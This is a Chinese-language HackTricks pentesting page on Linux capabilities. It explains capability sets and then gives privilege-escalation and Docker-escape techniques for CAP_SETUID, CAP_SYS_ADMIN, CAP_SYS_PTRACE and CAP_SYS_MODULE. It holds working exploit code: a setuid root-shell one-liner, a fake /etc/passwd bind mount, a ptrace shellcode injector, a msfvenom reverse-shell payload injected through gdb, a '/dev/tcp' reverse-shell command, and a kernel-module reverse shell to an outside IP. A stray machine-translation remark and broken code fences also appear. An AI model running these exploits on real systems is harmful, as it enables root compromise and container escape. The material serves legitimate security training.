# Linux Capabilities

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。以**推广技术知识**为使命，这个大会是技术和网络安全专业人士的热点聚集地。\\

{% embed url="https://www.rootedcon.com/" %}

## 为什么需要capabilities？

Linux capabilities **提供了root权限的一个子集**给进程。这有效地将root权限分解成更小、更独特的单元。然后，这些单元可以独立地授予给进程。这样，权限的完整集合被减少，降低了被利用的风险。

为了更好地理解Linux capabilities的工作原理，让我们先看看它试图解决的问题。

假设我们以普通用户身份运行一个进程。这意味着我们是非特权的。我们只能访问属于我们、我们组的数据，或者标记为所有用户都可以访问的数据。在某个时刻，我们的进程需要更多的权限来完成其职责，比如打开一个网络套接字。问题是普通用户不能打开套接字，因为这需要root权限。

## Capabilities集合

**继承的capabilities**

**CapEff**：_有效_ capability集合代表了进程目前正在使用的所有capabilities（这是内核用于权限检查的实际capability集合）。对于文件capabilities，有效集合实际上是一个单一的位，指示在运行二进制文件时，允许集合中的capabilities是否会移动到有效集合中。这使得不具备capability意识的二进制文件能够在不发出特殊系统调用的情况下使用文件capabilities。

**CapPrm**：(_允许的_) 这是线程可能添加到线程允许或线程继承集合中的capabilities的超集。线程可以使用capset()系统调用来管理capabilities：它可以从任何集合中删除任何capability，但只能将其线程允许集合中的capabilities添加到其线程有效和继承集合中。因此，除非它在其线程有效集合中具有cap\_setpcap capability，否则它不能将任何capability添加到其线程允许集合中。

**CapInh**：使用_继承的_集合可以指定允许从父进程继承的所有capabilities。这防止了进程接收它不需要的任何capabilities。这个集合在`execve`中被保留，并且通常由一个_接收_ capabilities的进程设置，而不是由一个向其子进程分发capabilities的进程设置。

**CapBnd**：通过_边界_集合，可以限制进程可能接收的capabilities。只有在边界集合中存在的capabilities才会被允许在继承和允许集合中。

**CapAmb**：_环境_ capability集合适用于所有没有文件capabilities的非SUID二进制文件。它在调用`execve`时保留capabilities。然而，并非环境集合中的所有capabilities都可能被保留，因为如果它们不在继承或允许capability集合中，它们将被丢弃。这个集合在`execve`调用中被保留。

有关线程和文件中capabilities的区别，以及capabilities如何传递给线程的详细解释，请阅读以下页面：

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## 进程 & 二进制文件的Capabilities

### 进程Capabilities

要查看特定进程的capabilities，请使用/proc目录中的**status**文件。因为它提供了更多细节，让我们仅限于与Linux capabilities相关的信息。\
请注意，对于所有运行中的进程，capability信息是按线程维护的，对于文件系统中的二进制文件，则存储在扩展属性中。

您可以在/usr/include/linux/capability.h中找到定义的capabilities

您可以通过`cat /proc/self/status`或执行`capsh --print`找到当前进程的capabilities，以及在`/proc/<pid>/status`中找到其他用户的capabilities。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
```markdown
此命令在大多数系统上应返回5行。

* CapInh = 继承的能力
* CapPrm = 允许的能力
* CapEff = 有效的能力
* CapBnd = 边界集
* CapAmb = 环境能力集
```
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
这些十六进制数字没有意义。使用 capsh 工具，我们可以将它们解码为 capabilities 名称。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
让我们现在检查 `ping` 使用的**capabilities**：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
尽管那样可行，但还有另一种更简单的方法。要查看正在运行的进程的capabilities，只需使用 **getpcaps** 工具，后跟其进程ID（PID）。您也可以提供一系列进程ID。
```bash
getpcaps 1234
```
让我们检查在给予二进制文件足够的能力（`cap_net_admin` 和 `cap_net_raw`）来嗅探网络后的 `tcpdump` 的能力（_tcpdump 正在进程 9562 中运行_）：
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
### 二进制文件的能力

二进制文件在执行时可以具有特定的能力。例如，常见的 `ping` 二进制文件具有 `cap_net_raw` 能力：
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
你可以使用以下命令**搜索具有能力的二进制文件**：
```bash
getcap -r / 2>/dev/null
```
### 使用 capsh 丢弃权限

如果我们为 _ping_ 丢弃 CAP\_NET\_RAW 权限，那么 ping 工具应该就无法工作了。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
除了 _capsh_ 本身的输出外，_tcpdump_ 命令本身也应该引发错误。

> /bin/bash: /usr/sbin/tcpdump: 操作不允许

错误清楚地表明 ping 命令不允许打开 ICMP 套接字。现在我们可以确定这是按预期工作的。

### 移除能力

你可以移除二进制文件的能力，使用
```bash
setcap -r </path/to/binary>
```
## 用户能力

显然，**也可以将能力分配给用户**。这可能意味着用户执行的每个进程都将能够使用用户的能力。\
根据[这个](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[这个](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)和[这个](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)的信息，需要配置一些文件来给用户指定特定的能力，但分配给每个用户的能力将由`/etc/security/capability.conf`文件决定。\
文件示例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 环境能力

编译以下程序可以**在提供能力的环境中生成一个bash shell**。

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
Since the provided text does not contain any English text that requires translation, there is no action needed. The markdown syntax provided is already complete and does not contain any translatable content. If you have any specific text that needs translation, please provide it, and I will assist you accordingly.
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
在**编译后的环境二进制文件执行的bash**中，可以观察到**新的能力**（普通用户在"当前"部分不会有任何能力）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
您**只能添加**同时存在于允许集和可继承集中的**能力**。
{% endhint %}

### 具备能力感知/无能力感知的二进制文件

**具备能力感知的二进制文件不会使用**环境赋予的新能力，然而**无能力感知的二进制文件会使用**它们，因为它们不会拒绝它们。这使得在特殊环境中，无能力感知的二进制文件变得容易受到攻击，因为该环境授予了二进制文件能力。

## 服务的能力

默认情况下，**以 root 身份运行的服务将被分配所有能力**，在某些情况下，这可能是危险的。\
因此，**服务配置**文件允许**指定**您希望它具有的**能力**，**以及**应该执行服务的**用户**，以避免服务带有不必要的权限：
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker 容器中的能力

默认情况下，Docker 会为容器分配一些能力。通过运行以下命令，可以非常容易地检查这些能力是什么：
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。其使命是**推广技术知识**，这个大会是技术和网络安全专业人士在各个领域的交流热点。

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

当你**想要在执行特权操作后限制自己的进程**（例如，设置chroot和绑定到一个套接字之后）时，Capabilities是有用的。然而，它们可以通过传递恶意命令或参数来利用，这些命令或参数随后以root身份运行。

你可以使用 `setcap` 强制对程序施加Capabilities，并使用 `getcap` 查询这些Capabilities：
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` 表示您正在添加能力（“-”将移除它）作为有效和允许的。

要识别系统或文件夹中具有能力的程序：
```bash
getcap -r / 2>/dev/null
```
### 利用示例

在以下示例中，二进制文件 `/usr/bin/python2.6` 被发现存在提权漏洞：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** 需要由 `tcpdump` 来**允许任何用户嗅探数据包**：
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### 特殊情况：“空”能力集

请注意，可以为程序文件分配空的能力集，因此可以创建一个设置用户 ID 为 root 的程序，该程序将执行该程序的进程的有效和保存的设置用户 ID 更改为 0，但不授予该进程任何能力。或者，简单地说，如果你有一个二进制文件：

1. 不是由 root 拥有
2. 没有设置 `SUID`/`SGID` 位
3. 设置了空的能力集（例如：`getcap myelf` 返回 `myelf =ep`）

那么**该二进制文件将以 root 身份运行**。

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 基本上是一个万能能力，它可以轻松导致获得额外的能力或完全的 root（通常是访问所有能力）。`CAP_SYS_ADMIN` 需要执行一系列**管理操作**，如果容器内执行特权操作，则难以从容器中删除此能力。对于模拟整个系统的容器来说，保留这个能力通常是必要的，与可以更加限制的单个应用程序容器相比。除其他事项外，这允许**挂载设备**或滥用 **release\_agent** 以从容器中逃逸。

**带二进制文件的示例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
使用python，您可以将修改过的 _passwd_ 文件挂载到真实的 _passwd_ 文件之上：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最后，将修改后的`passwd`文件**挂载**到`/etc/passwd`：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
你将能够使用密码 "password" 以 **`su` 作为 root**。

**带环境的示例（Docker breakout）**

你可以使用以下命令检查 docker 容器内启用的 capabilities：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在前面的输出中，您可以看到 SYS\_ADMIN 能力已启用。

* **挂载**

这允许 docker 容器**挂载宿主磁盘并自由访问**：
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **完全访问**

在前一种方法中，我们成功访问了docker宿主机的磁盘。\
如果你发现宿主机正在运行一个**ssh**服务器，你可以**在docker宿主机磁盘内创建一个用户**，然后通过SSH访问它：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**这意味着您可以通过在宿主机中运行的某个进程内注入shellcode来逃离容器。** 要访问在宿主机内运行的进程，容器至少需要使用 **`--pid=host`** 运行。

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `ptrace(2)` 以及最近引入的跨内存附加系统调用，如 `process_vm_readv(2)` 和 `process_vm_writev(2)`。如果授予了这个能力，并且 `ptrace(2)` 系统调用本身没有被seccomp过滤器阻止，这将允许攻击者绕过其他seccomp限制，参见 [如果允许ptrace则绕过seccomp的PoC](https://gist.github.com/thejh/8346f47e359adecd1d53) 或 **以下PoC**：

**使用二进制文件（python）的示例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**示例：使用二进制文件（gdb）**

具有 `ptrace` 能力的 `gdb`：
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
创建一个用 msfvenom 制作的 shellcode，通过 gdb 注入到内存中
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
使用 gdb 调试一个 root 进程并复制粘贴之前生成的 gdb 代码行：
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**示例（Docker breakout）- 另一种 gdb 滥用**

如果 **GDB** 已安装（或者您可以使用 `apk add gdb` 或 `apt install gdb` 等命令安装），您可以**从宿主机调试进程**并使其调用 `system` 函数。（此技术还需要 `SYS_ADMIN` 权限）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
```markdown
你将无法看到执行命令的输出，但该命令将由该进程执行（因此获取一个反向 shell）。

{% hint style="warning" %}
如果你收到错误 "No symbol "system" in current context."，请检查通过 gdb 在程序中加载 shellcode 的前一个示例。
{% endhint %}

**带环境的示例（Docker breakout）- Shellcode 注入**

你可以使用以下命令检查 Docker 容器内启用的 capabilities：
```
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
列出在**主机**上运行的**进程** `ps -eaf`

1. 获取**架构** `uname -m`
2. 寻找适合该架构的**shellcode** ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. 找到一个**程序**来将**shellcode**注入进程内存 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **修改**程序中的**shellcode**并**编译**它 `gcc inject.c -o inject`
5. **注入**并获取你的**shell**：`./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

[**CAP_SYS_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程加载和卸载任意内核模块（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` 系统调用）。这可能导致简单的权限提升和 ring-0 妥协。内核可以随意修改，颠覆所有系统安全、Linux 安全模块和容器系统。\
**这意味着你可以** **在主机的内核中插入/移除内核模块。**

**二进制示例**

在以下示例中，二进制文件 **`python`** 具有此能力。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
默认情况下，**`modprobe`** 命令会在目录 **`/lib/modules/$(uname -r)`** 中检查依赖列表和映射文件。\
为了滥用这一点，让我们创建一个假的 **lib/modules** 文件夹：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
然后**编译内核模块，下面有2个示例，然后复制**到这个文件夹：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最后，执行所需的python代码来加载这个内核模块：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**示例 2 中的二进制文件**

在以下示例中，二进制文件 **`kmod`** 具有此能力。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
```markdown
这意味着可以使用命令 **`insmod`** 来插入一个内核模块。按照下面的例子操作，通过滥用这个权限来获取一个**反向 shell**。

**带环境的例子（Docker breakout）**

你可以使用以下命令检查 Docker 容器内启用的 capabilities：
```
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在前面的输出中，您可以看到 **SYS\_MODULE** 能力已启用。

**创建** 将要执行反向 shell 的 **内核模块** 和 **Makefile** 以 **编译** 它：

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
